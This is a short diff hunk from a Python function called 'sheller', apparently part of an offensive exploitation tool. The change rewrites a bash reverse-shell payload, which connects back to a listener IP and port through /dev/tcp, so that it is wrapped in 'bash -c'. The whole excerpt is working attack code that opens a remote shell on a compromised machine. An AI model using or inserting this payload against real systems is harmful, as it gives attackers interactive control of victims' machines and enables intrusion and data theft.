@@ -854,7 +854,7 @@ def sheller(
                         break
 
     if success:
-        PAYLOAD = "bash -i >& /dev/tcp/{}/{} 0>&1".format(
+        PAYLOAD = "bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'".format(
             vars.LISTENIP, vars.LISTENPORT,
         )
         # don't wait for shell requests to finish, so that
